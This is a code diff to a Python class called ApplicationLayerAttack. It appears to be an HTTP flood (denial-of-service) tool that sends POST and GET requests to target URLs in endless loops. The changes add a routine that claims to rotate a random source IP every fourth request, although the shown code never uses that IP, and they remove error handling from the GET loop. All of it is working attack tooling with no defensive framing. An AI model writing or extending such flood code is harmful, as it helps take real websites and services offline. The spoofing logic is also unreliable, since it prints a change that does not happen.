@@ -163,10 +163,17 @@ class ApplicationLayerAttack:
         print("Using POST method to:", vector)
         print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
         time.sleep(10)
+        count = 0  
+
         while True:
             for target in vector:
-                response = res.post(target, data=bye)
+                if count % 4 == 0:  
+                    src_ip = random_ip()
+                    print(f"Changing source IP to: {src_ip}")
+
+                response = res.post(target, data=bye) 
                 print(response.text)
+                count += 1
 
     @staticmethod
     def get(vector: list, bye: bytes):
@@ -174,21 +181,24 @@ class ApplicationLayerAttack:
         print("Using GET method to:", vector)
         print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
         time.sleep(10)
-    
+        count = 0  
+
         while True:
             for target in vector:
-                try:
-                    headers = {
-                        'Connection': 'keep-alive',
-                        'Content-Length': str(len(bye)),
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
-                    }
-                    response = res.get(target, headers=headers, stream=True)
-                    
+                if count % 4 == 0:  
+                    src_ip = random_ip()
+                    print(f"Changing source IP to: {src_ip}")
 
-                    for chunk in response.iter_content(chunk_size=4096):
-                        if chunk:
-                            print(f'Received chunk from {target}:', chunk[:100]) 
-                except Exception as e:
-                    print(f"Error occurred: {e}")
-    
+                headers = {
+                    'Connection': 'keep-alive',
+                    'Content-Length': str(len(bye)),
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+                }
+                response = res.get(target, headers=headers, stream=True)
+
+                for chunk in response.iter_content(chunk_size=4096):
+                    if chunk:
+                        print(f'Received chunk from {target}:', chunk[:100])
+                
+                count += 1
+
